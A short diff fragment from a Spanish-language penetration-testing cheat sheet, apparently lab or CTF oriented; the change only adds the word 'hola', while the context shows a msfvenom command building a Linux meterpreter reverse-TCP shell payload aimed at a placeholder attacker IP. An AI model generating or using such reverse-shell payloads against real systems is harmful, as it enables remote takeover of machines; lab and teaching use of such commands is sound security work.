@@ -7,6 +7,8 @@ En todos estos ejemplos, LHOST será la dirección IP de su máquina atacante y 
 
 LA
 
+hola
+
 **Linux Shell**
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
